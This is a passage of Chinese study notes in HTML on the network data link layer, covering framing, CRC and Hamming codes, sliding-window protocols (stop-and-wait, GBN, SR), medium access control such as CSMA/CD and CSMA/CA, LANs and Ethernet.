title="字符计数法"></a>字符计数法</h3><p>帧首部使用一个计数字段(第一个字节，八位)来标明帧内字符数</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319004252864.png" alt="image-20240319004252864"></p><p>但是这样万一其中一个字符数错了，会导致后面所有都出现错误，所以该方法不常用。</p><h3 id="字符填充法"><a href="#字符填充法" class="headerlink" title="字符填充法"></a>字符填充法</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319004625498.png" alt="image-20240319004625498"></p><p>如上图在数据传输过程中可能会遇到在数据部分有控制字符导致接收方错误判断帧边界，所以可以用下面的字符填充法，有点类似编程语言中的转义字符。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319004800029.png" alt="image-20240319004800029"></p><p>发送时在控制字符前添加转义字符ESC，接收时就把所有转义字符去掉</p><h3 id="零比特填充法"><a href="#零比特填充法" class="headerlink" title="零比特填充法"></a>零比特填充法</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319005002833.png" alt="image-20240319005002833"></p><h3 id="违规编码法"><a href="#违规编码法" class="headerlink" title="违规编码法"></a>违规编码法</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319005216244.png" alt="image-20240319005216244"></p><p>我们可以知道在物理层的曼彻斯特编码中的码元要不就高-低或者低-高，高-高和低-低是不可能出现的，所以这两种就是违规的编码，这样我们就可以用来界定帧的起始和终止而不会重复，非常的稳妥。</p><blockquote><p>由于字节计数法中Count字段的脆弱性(其值若有差错将导致灾难性后果)及字符填充实现上的复杂性和不兼容性，目前较普遍使用的帧同步法是比特填充和违规编码法。</p></blockquote><h1 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h1><h2 id="差错控制介绍"><a href="#差错控制介绍" class="headerlink" title="差错控制介绍"></a>差错控制介绍</h2><p>概括来说，传输中的差错主要是由于噪声引起的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319092243604.png" alt="image-20240319092243604"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319092442403.png" alt="image-20240319092442403"></p><h2 id="检错编码"><a href="#检错编码" class="headerlink" title="检错编码"></a>检错编码</h2><p><strong>奇偶校验码</strong></p><ol><li>奇校验码就是比特中1的个数为奇数</li><li>偶校验码就是比特中1的个数为偶数</li></ol><blockquote><p>但是这种校验方式如果出现偶数个比特出错就校验不出来了，因为会和原比特流的奇偶性一致。</p></blockquote><p><strong>CRC循环冗余码</strong></p><p>这里有点类似于用除法和余数的关系来检测数据，下面是一个简单的除法来解释crc冗余码的原理</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319181343240.png" alt="image-20240319181343240"></p><p>比如有一个1101的除数，那他的生成多项式就是：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319181544775.png" alt="image-20240319181544775"></p><p>下面是一个计算FCS的例子：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319181821496.png" alt="image-20240319181821496"></p><blockquote><p>FCS的生成以及接收端CRC检验都是由硬件实现，处理很迅速因此不会延误数据的传输</p></blockquote><p>链路层使用CRC检验，能够实现无比特差错的传输，但这还不是可靠传输，因为有些帧被丢弃了。</p><h2 id="纠错编码"><a href="#纠错编码" class="headerlink" title="纠错编码"></a>纠错编码</h2><p>海明码可以发现错误并找到位置，最后纠正错误</p><p><strong>工作流程</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319094010233.png" alt="image-20240319094010233"></p><p><strong>海明距离(码距)</strong></p><p>两个合法编码(码字)的对应比特取值不同的比特数称为这两个码字的海明距离(码距)，一个有效编码集中,任意两个合法编码(码字)的海明距离的最小值称为该编码集的海明距离(码距)。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319174734678.png" alt="image-20240319174734678"></p><p>比如左边第一个000和001有一个比特位不一样同时也是最小的，所以码距为1，同理右边这个为2；</p><p>所以当码距为d时，要检查出错误的话就只能检测出d-1位，因为如果有d位出错的话可能变成一个正确的编码，这样就无法判断了。</p><p>而想要纠错d位的话就要2d+1码距了。</p><h3 id="确定校验码位数r"><a href="#确定校验码位数r" class="headerlink" title="确定校验码位数r"></a>确定校验码位数r</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182311727.png" alt="image-20240319182311727"></p><h3 id="确定校验码和数据的位置"><a href="#确定校验码和数据的位置" class="headerlink" title="确定校验码和数据的位置"></a>确定校验码和数据的位置</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182425486.png" alt="image-20240319182425486"></p><h3 id="求出校验码的值"><a href="#求出校验码的值" class="headerlink" title="求出校验码的值"></a>求出校验码的值</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182555883.png" alt="image-20240319182555883"></p><h3 id="检错并纠错"><a href="#检错并纠错" class="headerlink" title="检错并纠错"></a>检错并纠错</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182901466.png" alt="image-20240319182901466"></p><p><strong>纠错方法一</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182927374.png" alt="image-20240319182927374"></p><p><strong>纠错方法二</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319182949728.png" alt="image-20240319182949728"></p><h1 id="流量控制与可靠传输机制"><a href="#流量控制与可靠传输机制" class="headerlink" title="流量控制与可靠传输机制"></a>流量控制与可靠传输机制</h1><p>较高的发送速度和较低的接收能力的不匹配，会造成传输出错，因此流量控制也是数据链路层的一项重要工作。</p><p><strong>传输层和链路层流量控制的区别</strong></p><p>数据链路层时点对点的(指两个相邻节点)，传输层是端到端的(指两个主机之间)</p><p>数据链路层流量控制手段:接收方收不下就不回复确认。</p><p>传输层流量控制手段:接收端给发送端一个窗口公告。</p><p><strong>流量控制的方法</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320004554062.png" alt="image-20240320004554062"></p><p>所谓的滑动窗口就是接收方收到数据往后移动一帧，发送方收到确认就往后移动一帧；</p><p>停止-等待协议也可以看做是一个窗口为1的特殊的滑动窗口协议</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320004750636.png" alt="image-20240320004750636"></p><p>数据链路层的滑动窗口在传输过程中都是确定的，而传输层则不一定</p><p><strong>可靠传输、滑动窗口、流量控制</strong></p><p>可靠传输：发送端发啥，接收端收啥</p><p>流量控制：控制发送速率，使接收方有足够的缓冲空间来接收每一个帧。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320005114497.png" alt="image-20240320005114497"></p><h2 id="停止等待协议"><a href="#停止等待协议" class="headerlink" title="停止等待协议"></a>停止等待协议</h2><p><strong>停止等待协议的目的</strong></p><p>除了比特出差错，底层信道还会出现丢包问题。为了实现流量控制。</p><p><strong>前提</strong></p><p>“停止-等待”就是每发送完一个分组就停止发送，等待对方确认，在收到确认后再发送下一个分组。</p><p><strong>应用情况分为两种</strong></p><p>无差错情况&amp;有差错情况</p><h3 id="无差错情况"><a href="#无差错情况" class="headerlink" title="无差错情况"></a>无差错情况</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321081756032.png" alt="image-20240321081756032"></p><p>0号帧只是编号一样，两个帧是不一样的</p><h3 id="有差错情况"><a href="#有差错情况" class="headerlink" title="有差错情况"></a>有差错情况</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321082020356.png" alt="image-20240321082020356"></p><ol><li><p>发完一个帧后，必须保留它的副本。</p></li><li><p>数据帧和确认帧必须编号。</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321082242961.png" alt="image-20240321082242961"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321082347053.png" alt="image-20240321082347053"></p><p>此时若在收到重传确认0号帧之前收到了之前迟到的确认0号帧，在收到重传确认帧之后也会将其丢弃。</p><h3 id="信道利用率"><a href="#信道利用率" class="headerlink" title="信道利用率"></a>信道利用率</h3><p><strong>定义</strong></p><p>发送方在一个发送周期内，有效地发送数据所需要的时间占整个发送周期的比率。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321082926486.png" alt="image-20240321082926486"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321082757357.png" alt="image-20240321082757357"></p><p><strong>例题</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321083051546.png" alt="image-20240321083051546"></p><h2 id="后退N帧协议-GBN协议"><a href="#后退N帧协议-GBN协议" class="headerlink" title="后退N帧协议(GBN协议)"></a>后退N帧协议(GBN协议)</h2><p><strong>后退N帧协议中的滑动窗口</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328005017907.png" alt="image-20240328005017907"></p><p>这里的接收窗口为一，发送窗口有多个</p><p>当发送窗口或者接收窗口确认发送或者接收之后就会向下滑动。</p><p>后退N帧还有一个不同于停止等待的特点就是他可以累计确认，就是不需要每一帧都发送确认，比如在收到3号帧的时候才发送确认帧代表前面都是正常接收到的。</p><p><strong>GBN发送方需要响应的三件事</strong></p><ol><li><p>上层的调用</p><p>上层要发送数据时，发送方先检查发送窗口是否已满，如果未满，则产生一个帧并将其发送；如果窗口己满发送方只需将数据返回给上层，暗示上层窗口己满。上层等一会再发送。(实际实现中，发送方可以缓存这些数据，窗口不满时再发送帧)。</p></li><li><p>收到了一个ACK确认帧</p><p>GBN协议中，对n号帧的确认采用累积确认的方式，标明接收方已经收到n号帧和它之前的全部帧。</p></li><li><p>超时事件</p><p>协议的名字为后退N帧&#x2F;回退N帧，来源于出现丢失和时延过长帧时发送方的行为。就像在停等协议中一样定时器将再次用于恢复数据帧或确认帧的丢失。如果出现超时，发送方重传所有已己发送但未被确认的帧。</p><blockquote><p>比如发送方发送了一个1号帧但是丢失了，后续继续发送2、3、4号帧，但是接收方接收到0号帧之后会等待接收1号帧，但是来的是非1号帧他就会丢弃；所以导致双方都在等待，超过一段时间后发送方就会重传之前1号帧包括1号帧发送之后的数据。</p></blockquote></li></ol><p><strong>GBN接收方需要做的事</strong></p><p> <img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328152503951.png" alt="image-20240328152503951"></p><p><strong>整个GBN协议的流程图</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328152727575.png" alt="image-20240328152727575"></p><p><strong>滑动窗口的长度</strong></p><p>若采用n比特对帧编号，那么发送窗口的尺寸W，应满足:1≤ W≤2^n-1。因为发送窗口尺寸过大，就会使得接收方无法区别新帧和旧帧。</p><h2 id="选择重传协议-SR"><a href="#选择重传协议-SR" class="headerlink" title="选择重传协议(SR)"></a>选择重传协议(SR)</h2><p><strong>GBN协议的弊端</strong></p><p>由于累计确认的原因，已发送过的帧也要重传就浪费了很多资源。</p><p><strong>解决办法：</strong>设置单个确认，同时加大接收窗口，设置接收缓存，缓存乱序到达的帧。</p><p><strong>这是两个有关SR的滑动窗口例子</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331155314314.png" alt="image-20240331155314314"></p><h3 id="SR发送方要做的事"><a href="#SR发送方要做的事" class="headerlink" title="SR发送方要做的事"></a>SR发送方要做的事</h3><ol><li><p>上层的调用<br>从上层收到数据后，SR发送方检查下一个可用于该帧的序号，如果序号位于发送窗口内，则发送数据帧;否则就像GBN一样，要么将数据缓存，要么返回给上层之后再传输。</p></li><li><p>收到了一个ACK<br>如果收到ACK，加入该帧序号在窗口内，则SR发送方将那个被确认的帧标记为已接收。如果该帧序号是窗口的下界(最左边第一个窗口对应的序号)，则窗口向前移动到具有最小序号的未确认帧处。如果窗口移动了并且有序号在窗口内的未发送帧，则发送这些帧。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331155626452.png" alt="image-20240331155626452"></p></li><li><p>超时事件<br>每个帧都有自己的定时器，一个超时事件发生后只重传一个帧。</p></li></ol><h3 id="SR接收方要做的事"><a href="#SR接收方要做的事" class="headerlink" title="SR接收方要做的事"></a>SR接收方要做的事</h3><p>SR接收方将确认一个正确接收的帧而不管其是否按序。失序的帧将被缓存，并返回给发送方一个该帧的确认帧【收谁确认谁】，直到所有(即序号更小的帧)皆被收到为止，这时才可以将一批帧按序交付给上层，然后向前移动滑动窗口。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331155942903.png" alt="image-20240331155942903"></p><p>如果收到了窗口序号之外的帧，就返回一个ACK，不过这个帧是要小于下界的帧，因为前面的帧都是已经接收过的，可能在发送ACK确认帧的时候丢失了，导致触发了超时重传。</p><h3 id="运行中的SR的流程图"><a href="#运行中的SR的流程图" class="headerlink" title="运行中的SR的流程图"></a>运行中的SR的流程图</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331160353171.png" alt="image-20240331160353171"></p><p> <strong>窗口长度限制</strong></p><p>窗口长度过长会导致二义性的问题，即接收方无法区分是新帧还是旧帧，发送窗口的大小最好等于接收窗口</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331160748621.png" alt="image-20240331160748621"></p><blockquote><p>n是比特位数</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331160808971.png" alt="image-20240331160808971"></p><p><strong>SR协议总结</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331161019994.png" alt="image-20240331161019994"></p><h1 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h1><p><strong>传输数据使用的两种链路</strong></p><ol><li><p>点对点链路：两个相邻节点通过一个链路相连，没有第三者；</p><p>应用：PPP协议，常用于广域网。</p></li><li><p>广播式链路：所有主机共享通信介质；</p><p>应用：早期的总线以太网、无线局域网，常用于局域网</p><p>典型拓扑结构：总线型、星型(逻辑总线型)</p></li></ol><p><strong>介质访问控制</strong></p><p>就是采取一定的措施，使得两对节点之间的通信不会发生互相干扰的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331223817687.png" alt="image-20240331223817687"></p><blockquote><p>动态分配的特点：信道并非在用户通信时固定分配给用户。</p><p>三种访问控制协议中只有随机访问会发生冲突</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401001558136.png" alt="image-20240401001558136"></p><h2 id="信道划分介质访问控制"><a href="#信道划分介质访问控制" class="headerlink" title="信道划分介质访问控制"></a>信道划分介质访问控制</h2><p>使用介质的每个设备与来自同一信道上的其他设备的通信隔离开，把时域和频域资源合理地分配给网络上的设备。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331224034767.png" alt="image-20240331224034767"></p><h3 id="FDM"><a href="#FDM" class="headerlink" title="FDM"></a>FDM</h3><p><strong>频分多路复用</strong></p><p>用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。频分复用的所有用户在同样的时间占用不同的带宽(频率带宽)资源。</p><p>充分利用传输介质带宽，系统效率较高:由于技术比较成熟，实现也比较容易。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331224236833.png" alt="image-20240331224236833"></p><h3 id="TDM"><a href="#TDM" class="headerlink" title="TDM"></a>TDM</h3><p><strong>时分多路复用</strong></p><p>将时间划分为一段段等长的时分复用帧(TDM帧)。每一个时分复用的用户在每一个TDM帧中占用固定序号的时隙，所有用户轮流占用信道。可以提高信道利用率。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331224352471.png" alt="image-20240331224352471"></p><p><strong>统计时分复用STDM</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331224551762.png" alt="image-20240331224551762"></p><h3 id="WDM"><a href="#WDM" class="headerlink" title="WDM"></a>WDM</h3><p><strong>波分多路复用</strong></p><p>波分多路复用就是光的频分多路复用，在一根光纤中传输多种不同波长(频率)的光信号，由于波长(频率)不同，所以各路光信号互不干扰，最后再用波长分解复用器将各路波长分解出来。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331224810520.png" alt="image-20240331224810520"></p><h3 id="CDM"><a href="#CDM" class="headerlink" title="CDM"></a>CDM</h3><p><strong>码分多路复用</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331225152377.png" alt="image-20240331225152377"></p><h2 id="随机访问介质访问控制"><a href="#随机访问介质访问控制" class="headerlink" title="随机访问介质访问控制"></a>随机访问介质访问控制</h2><p>所有用户可随机发送信息，发送信息时占全部带宽。</p><h3 id="ALOHA协议"><a href="#ALOHA协议" class="headerlink" title="ALOHA协议"></a>ALOHA协议</h3><p>该协议分为两种：</p><ol><li>纯ALOHA协议</li><li>时隙ALOHA协议</li></ol><p><strong>纯ALOHA协议</strong></p><p>不监听信道，不按时间槽发送，随机重发。想发就发</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331225826465.png" alt="image-20240331225826465"></p><ul><li>冲突检测：如果发生冲突，接收方在就会检测出差错然后不予确认，发送方在一定时间内收不到就判断发生冲突。</li><li>冲突如何解决：超时后等一随机时间再重传。</li></ul><p><strong>时隙ALOHA协议</strong></p><p>时隙ALOHA协议的思想：把时间分成若干个相同的时间片，所有用户在时间片开始时刻同步接入网络信道若发生冲突，则必须等到下一个时间片开始时刻再发送。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331230108274.png" alt="image-20240331230108274"></p><ol><li>纯ALOHA比时隙ALOHA吞吐量更低，效率更低。</li><li>纯ALOHA想发就发，时隙ALOHA只有在时间片段开始时才能发。</li></ol><h3 id="CSMA协议"><a href="#CSMA协议" class="headerlink" title="CSMA协议"></a>CSMA协议</h3><p>即叫做载波监听多路访问协议CSMA(carrier sense multiple access)</p><ul><li><p><strong>CS</strong>：载波侦听&#x2F;监听，每一个站在发送数据之前要检测一下总线上是否有其他计算机在发送数据。</p><blockquote><p>当几个站同时在总线上发送数据时，总线上的信号电压摆动值将会增大(互相叠加)。当一个站检测到的信号电压摆动值超过一定门限值时，就认为总线上至少有两个站同时在发送数据，表明产生了碰撞，即发生了冲突。</p></blockquote></li><li><p><strong>MA</strong>：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331232412543.png" alt="image-20240331232412543"></p><ol><li><p><strong>1-坚持CSMA</strong>：</p><p>如果一个主机要发送消息，那么它先监听信道。<br>空闲则直接传输，不必等待。<br>忙则一直监听，直到空闲马上传输。<br>如果有冲突(一段时间内未收到肯定回复)，则等待一个随机长的时间再监听，重复上述过程。</p><p>优点：只要媒体空闲，站点就马上发送，避免了媒体利用率的损失。<br>缺点：假如有两个或两个以上的站点有数据要发送，冲突就不可避免。</p></li><li><p><strong>非坚持CSMA</strong>：</p><p>如果一个主机要发送消息，那么它先监听信道空闲则直接传输，不必等待。忙则等待一个随机的时间之后再进行监听。</p><p>优点：采用随机的重发延迟时间可以减少冲突发生的可能性。</p><p>缺点：可能存在大家都在延迟等待过程中，使得媒体仍可能处于空闲状态，媒体使用率降低</p></li><li><p><strong>p-坚持CSMA协议</strong>：p-坚持指的是对于监听信道空闲的处理</p><p>如果一个主机要发送消息，那么它先监听信道</p><p>空闲则以p概率直接传输，不必等待；概率1-p等待到下一个时间槽再传输。</p><p>忙则持续监听直到信道空闲再以p概率发送。</p><p>若冲突则等到下一个时间槽开始再监听并重复上述过程。</p><p>优点：既能像非坚持算法那样减少冲突，又能像1-坚持算法那样减少媒体空闲时间的这种方案</p><p>缺点：发生冲突后还是要坚持把数据帧发送完，造成了浪费。</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331233405613.png" alt="image-20240331233405613"></p><h3 id="CSMA-CD协议"><a href="#CSMA-CD协议" class="headerlink" title="CSMA&#x2F;CD协议"></a>CSMA&#x2F;CD协议</h3><p>载波监听多点接入&#x2F;碰撞检测CSMA&#x2F;CD(carrier sense multiple access with collision detection)</p><ul><li><strong>CS</strong>：载波侦听&#x2F;监听，每一个站在发送数据之前以及发送数据时都要检测一下总线上是否有其他计算机在发送数据。和上面的相比多了一个发送时监听。</li><li><strong>MA</strong>：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。总线型网络。</li><li><strong>CD</strong>：碰撞检测(冲突检测)，“边发送边监听，适配器边发送数据边检测信道上信号电压的变化情况，以便判断自己在发送数据时其他站是否也在发送数据。说明用于半双工网络。</li></ul><p><strong>传播时延对载波监听的影响</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331234826159.png" alt="image-20240331234826159"></p><p><strong>碰撞后的重传机制</strong></p><p>使用截断二进制指数规避算法</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331235336764.png" alt="image-20240331235336764"></p><p><strong>最小帧长问题</strong></p><p>因为该协议就是为了即使控制帧的传输，如果帧已经发完了就没有控制的意义了，所以会规定一个最小帧长以便在帧发送完之前可以检测到冲突并及时控制传输。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240331235646524.png" alt="image-20240331235646524"></p><blockquote><p>以太网规定的最短帧长为64B，所以长度小于64B的都是由于冲突而异常终止的无效帧。</p></blockquote><h3 id="CDMA-CA协议"><a href="#CDMA-CA协议" class="headerlink" title="CDMA&#x2F;CA协议"></a>CDMA&#x2F;CA协议</h3><p>载波监听多点接入&#x2F;碰撞避免CSMA&#x2F;CA(carrier sense multiple access with collision avoidance)</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401000102318.png" alt="image-20240401000102318"></p><p><strong>工作原理</strong></p><ol><li>发送数据前，先检测信道是否空闲</li><li>空闲则发出RTS(request to send)，RTS包括发射端的地址、接收端的地址、下一份数据将持续发送的时间等信息;信道忙则等待。</li><li>接收端收到RTS后，将响应CTS(clear tosend)</li><li>发送端收到CTS后，开始发送数据帧(同时预约信道:发送方告知其他站点自己要传多久数据)。</li><li>接收端收到数据帧后，将用CRC来检验数据是否正确，正确则响应ACK帧。</li><li>发送方收到ACK就可以进行下一个数据帧的发送，若没有则一直重传至规定重发次数为止(采用二进制指数退避算法来确定随机的推迟时间)。</li></ol><blockquote><p>RTS&#x2F;CTS是可选的的，主要用于解决隐蔽站的问题，但是一定要成对出现。</p></blockquote><h3 id="CD和CA的对比"><a href="#CD和CA的对比" class="headerlink" title="CD和CA的对比"></a>CD和CA的对比</h3><p><strong>相同点：</strong><br>CSMA&#x2F;CD与CSMA&#x2F;CA机制都从属于CSMA的思路，其核心是先听再说。换言之，两个在接入信道之前都须要进行监听。当发现信道空闲后，才能进行接入。<br><strong>不同点：</strong></p><ol><li>传输介质不同:CSMA&#x2F;CD用于总线式以太网【有线】，而CSMACA用于无线局域网【无线】</li><li>载波检测方式不同:因传输介质不同，CSMA&#x2F;CD与CSMA&#x2F;CA的检测方式也不同。CSMA&#x2F;CD通过电缆中电压的变化来检测，当数据发生碰撞时，电缆中的电压就会随着发生变化；而CSMA&#x2F;CA采用能量检测(ED)、载波检测(CS)和能量载波混合检测三种检测信道空闲的方式。</li><li>CSMA&#x2F;CD检测冲突，CSMA&#x2F;CA避免冲突，二者出现冲突后都会进行有上限的重传。</li></ol><h2 id="轮询访问介质访问控制"><a href="#轮询访问介质访问控制" class="headerlink" title="轮询访问介质访问控制"></a>轮询访问介质访问控制</h2><h3 id="轮询协议"><a href="#轮询协议" class="headerlink" title="轮询协议"></a>轮询协议</h3><p>主结点轮流”邀请”从属结点发送数据，也就是轮询发送一个短的询问帧看从属结点是否要发送数据</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401002015624.png" alt="image-20240401002015624"></p><p>不过会带来一些问题：</p><ol><li>轮询开销</li><li>等待延迟</li><li>单点故障</li></ol><h3 id="令牌传递协议"><a href="#令牌传递协议" class="headerlink" title="令牌传递协议"></a>令牌传递协议</h3><p><strong>令牌</strong>：一个特殊格式的MAC控制帧，不含任何协议</p><p>令牌用于控制信道的使用，确保同一时刻只有一个结点独占信道。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401002623143.png" alt="image-20240401002623143"></p><blockquote><p>工作流程大概如下：</p><p>假设D要给A发送数据，D持有令牌之后修改控制帧表示已经使用，然后在令牌后面带上数据构成数据帧，然后该数据帧就在令牌环中进行传递，当传到主机A的时候发现是发送给自己的就复制这一份数据，然后令牌传给D；D再检查自己的数据有没有出现问题需不需要重传，确认完毕之后就回收数据，再还原令牌的控制帧然后将令牌继续传递。</p></blockquote><p>每个结点都可以在一定时间内(令牌持有时间)获得发送数据的权利，并不是无限制的持有令牌；如果发送数据过大在一个令牌时间内无法发送完就需要分次发送，等待下一次令牌传递。</p><p><strong>该协议也会产生一些问题</strong></p><ol><li>令牌开销</li><li>等待延迟</li><li>单点故障</li></ol><blockquote><p>该协议应用于令牌环网（物理星型拓扑，逻辑环形拓扑）</p><p>该方式常用于负载较重、通信量较大的网络中，因为如果较为空闲的网络中，令牌可能会一直传递但没有使用造成浪费。</p></blockquote><h1 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h1><p>局域网(Local Area Network):简称LAN，是指在某一区域内由多台计算机互联成的计算机组，使用广播信道</p><ul><li>特点1:覆盖的地理范围较小，只在一个相对独立的局部范围内联，如一座或集中的建筑群内。</li><li>特点2:1使用专门铺设的传输介质(双绞线、同轴电缆)进行联网，数据传输速率高(10Mb&#x2F;s~10Gb&#x2F;s)</li><li>特点3:通信延迟时间短，误码率低，可靠性较高。</li><li>特点4:各站为平等关系，共享传输信道。</li><li>特点5:多采用分布式控制和广播式通信，能进行广播和组播，</li></ul><p>决定局域网的主要要素为：网络拓扑、传输介质和介质访问控制方法</p><h2 id="局域网拓扑结构"><a href="#局域网拓扑结构" class="headerlink" title="局域网拓扑结构"></a>局域网拓扑结构</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401215100579.png" alt="image-20240401215100579"></p><p>综上可以知道总线型的拓扑结构是比较好的，现在比较常用的也是总线型拓扑。</p><h2 id="局域网传输介质"><a href="#局域网传输介质" class="headerlink" title="局域网传输介质"></a>局域网传输介质</h2><ul><li>有线局域网：双绞线、同轴电缆、光纤</li><li>无线局域网：电磁波</li></ul><h2 id="局域网介质访问控制方法"><a href="#局域网介质访问控制方法" class="headerlink" title="局域网介质访问控制方法"></a>局域网介质访问控制方法</h2><ol><li><p>CSMA&#x2F;CD：常用于总线型局域网，也用于树型网络</p></li><li><p>令牌总线：常用于总线型局域网，也用于树型网络</p><p>它是把总线型或树型网络中的各个工作站按一定顺序如按接口地址大小排列形成一个逻辑环。只有令牌持有者才能控制总线，才有发送信息的权力。</p></li><li><p>令牌环：用于环形局域网，如令牌环网</p></li></ol><h2 id="局域网的分类"><a href="#局域网的分类" class="headerlink" title="局域网的分类"></a>局域网的分类</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401215625251.png" alt="image-20240401215625251"></p><h2 id="IEEE-802标准"><a href="#IEEE-802标准" class="headerlink" title="IEEE 802标准"></a>IEEE 802标准</h2><p>IEEE 802系列标准是IEEE 802 LAN&#x2F;MAN 标准委员会制定的局域网、城域网技术标准(1980年2月成立)。其中最广泛使用的有以太网、令牌环、无线局域网等。这一系列标准中的每一个子标准都由委员会中的一个专门工作组负责。</p><p><strong>下面是一些802的版本</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401215941515.png" alt="image-20240401215941515"></p><h2 id="MAC子层和LLC子层"><a href="#MAC子层和LLC子层" class="headerlink" title="MAC子层和LLC子层"></a>MAC子层和LLC子层</h2><p>IEEE802标准所描述的局域网参考模型只对应OSI参考模型的数据链路层与物理层，它将数据链路层划分为逻辑链路层LLC子层和介质访问控制MAC子层。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401220205402.png" alt="image-20240401220205402"></p><h1 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h1><p>以太网(Ethernet)指的是由Xerox公司创建并由Xerox、Intel和DEC公司联合开发的基带总线局域网规范，是当今现有局域网采用的最通用的通信协议标准。以太网络使用CSMA&#x2F;CD(载波监听多路访问及冲突检测)技术。</p><p><strong>以太网十分常用的原因</strong></p><ol><li>造价低廉</li><li>是应用最广泛的局域网技术</li><li>比令牌环网、ATM网便宜，简单</li><li>满足网络速率要求：10Mb&#x2F;s~10Gb&#x2F;s</li></ol><p><strong>以太网的两个标准</strong></p><ul><li>DIX Ethernet V2:第一个局域网产品(以太网)规约。</li><li>IEEE 802.3:IEEE 802委员会802.3工作组制定的第一个IEEE的以太网标准。(帧格式有一丢丢改动)</li></ul><h2 id="以太网提供无连接、不可靠的服务"><a href="#以太网提供无连接、不可靠的服务" class="headerlink" title="以太网提供无连接、不可靠的服务"></a>以太网提供无连接、不可靠的服务</h2><p>无连接：发送方和接收方之间无””握手过程”<br>不可靠：不对发送方的数据帧编号，接收方不向发送方进行确认，差错帧直接丢弃，差错纠正由高层负责。</p><blockquote><p>以太网只实现无差错接收，不实行可靠传输</p></blockquote><h2 id="以太网传输介质和拓扑结构发展"><a href="#以太网传输介质和拓扑结构发展" class="headerlink" title="以太网传输介质和拓扑结构发展"></a>以太网传输介质和拓扑结构发展</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240401221233925.png" alt="image-20240401221233925"></p><h2 